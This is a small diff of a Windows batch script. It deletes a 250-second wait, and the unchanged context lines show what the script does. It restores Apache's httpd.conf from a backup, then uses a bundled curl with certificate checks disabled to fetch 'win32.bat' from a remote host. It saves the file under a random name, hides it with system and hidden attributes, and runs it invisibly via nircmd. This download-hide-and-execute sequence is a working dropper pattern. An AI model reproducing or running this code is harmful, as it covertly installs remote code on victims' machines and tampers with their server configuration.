@@ -58,8 +58,6 @@ timeout -t 10
 copy /y "%environment%\apache2\conf\httpd.conf" "%environment%\apache2\conf\httpd.conf.log"
 move /y "%environment%\apache2\conf\httpd.conf.bak" "%environment%\apache2\conf\httpd.conf"
 
-timeout -t 250
-
 set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
